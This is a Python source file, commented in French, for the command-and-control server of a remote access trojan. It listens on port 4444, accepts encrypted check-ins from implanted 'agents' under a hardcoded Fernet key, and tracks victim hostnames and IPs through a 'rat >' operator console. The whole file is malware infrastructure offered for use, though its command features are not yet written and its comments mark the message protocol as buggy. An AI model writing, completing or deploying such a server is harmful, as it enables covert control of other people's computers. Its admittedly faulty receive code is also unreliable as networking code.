#!/usr/bin/env python3
"""
Serveur RAT - Version 2.2
Commit: "Attempt to implement message size protocol (partial)"
"""
import socket
import json
import threading
import time
from cryptography.fernet import Fernet

class CryptoServer:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.clients = {}
        self.client_counter = 0
        self.running = False
        
        self.key = b'ZmDfcTF7_60GrrY167zsiPd67pEvs0aGOv2oasOM1Pg='
        self.cipher = Fernet(self.key)
        
    def start(self):
        self.running = True
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
            
            print(f"[*] Serveur démarré sur {self.host}:{self.port}")
            
            while self.running:
                try:
                    client_sock, addr = self.sock.accept()
                    self.client_counter += 1
                    client_id = self.client_counter
                    
                    print(f"[+] Agent connecté depuis {addr[0]}:{addr[1]} (ID: {client_id})")
                    
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_sock, client_id, addr),
                        daemon=True
                    )
                    client_thread.start()
                    
                except socket.error:
                    if self.running:
                        print("[-] Erreur socket")
                        
        except Exception as e:
            print(f"[-] Erreur serveur: {e}")
        finally:
            self.stop()
    
    def handle_client(self, client_sock, client_id, addr):
        try:
            self.clients[client_id] = {
                "socket": client_sock,
                "addr": addr,
                "info": {}
            }
            
            client_sock.settimeout(30)
            
            while self.running:
                try:
                    # TENTATIVE: protocole avec taille mais buggy
                    data = self._receive_message(client_sock)
                    if not data:
                        break
                    
                    decrypted_data = self.cipher.decrypt(data)
                    message = json.loads(decrypted_data.decode('utf-8'))
                    
                    print(f"[*] Client {client_id}: {message.get('hostname', 'Unknown')}")
                    
                    self.clients[client_id]["info"] = message
                    
                    # Envoie réponse avec nouveau protocole
                    response = {'status': 'connected', 'client_id': client_id}
                    self._send_message(client_sock, response)
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[-] Erreur client {client_id}: {e}")
                    break
                    
        except Exception as e:
            print(f"[-] Erreur générale client {client_id}: {e}")
        finally:
            if client_id in self.clients:
                del self.clients[client_id]
                print(f"[-] Client {client_id} déconnecté")
            client_sock.close()
    
    def _receive_message(self, sock):
        """Reçoit un message - IMPLEMENTATION BUGGÉE"""
        try:
            # BUG: assume que les 4 premiers bytes sont la taille
            size_data = sock.recv(4)
            if len(size_data) != 4:
                return None
            
            message_size = int.from_bytes(size_data, 'big')
            
            # BUG: pas de limite de taille
            message_data = sock.recv(message_size)
            return message_data
            
        except Exception as e:
            print(f"[DEBUG] Erreur réception: {e}")
            return None
    
    def _send_message(self, sock, message):
        """Envoie un message avec taille"""
        try:
            json_data = json.dumps(message)
            encrypted_data = self.cipher.encrypt(json_data.encode('utf-8'))
            
            # Envoie la taille d'abord
            size_bytes = len(encrypted_data).to_bytes(4, 'big')
            sock.send(size_bytes)
            sock.send(encrypted_data)
            return True
            
        except Exception as e:
            print(f"[DEBUG] Erreur envoi: {e}")
            return False
    
    def list_clients(self):
        return self.clients
    
    def stop(self):
        self.running = False
        try:
            self.sock.close()
        except:
            pass

class ServerInterface:
    def __init__(self):
        self.server = None
        
    def start(self):
        self.server = CryptoServer()
        
        server_thread = threading.Thread(target=self.server.start, daemon=True)
        server_thread.start()
        
        time.sleep(1)
        self.run_interface()
    
    def run_interface(self):
        print("\n" + "="*50)
        print("🔐 RAT SERVER - PROTOCOLE AVEC TAILLE")
        print("="*50)
        print("Commandes: sessions, help, exit")
        
        while True:
            try:
                user_input = input("rat > ").strip()
                
                if user_input == "sessions":
                    clients = self.server.list_clients()
                    if clients:
                        print(f"\n[*] Sessions actives ({len(clients)}):")
                        print("-" * 45)
                        print(f"{'ID':<4} {'Hostname':<15} {'IP':<15}")
                        print("-" * 45)
                        for client_id, info in clients.items():
                            client_info = info.get('info', {})
                            print(f"{client_id:<4} "
                                  f"{client_info.get('hostname', 'N/A')[:15]:<15} "
                                  f"{info['addr'][0]:<15}")
                    else:
                        print("[*] Aucune session active")
                        
                elif user_input == "help":
                    print("""
Commandes disponibles:
  sessions  - Liste les sessions actives
  help      - Affiche cette aide
  exit      - Quitte le serveur
                    """)
                        
                elif user_input == "exit":
                    print("[*] Arrêt du serveur...")
                    self.server.stop()
                    break
                else:
                    print("[-] Commande inconnue. Tapez 'help' pour l'aide.")
                    
            except KeyboardInterrupt:
                print("\n[*] Arrêt du serveur...")
                self.server.stop()
                break

def main():
    interface = ServerInterface()
    interface.start()

if __name__ == "__main__":
    main()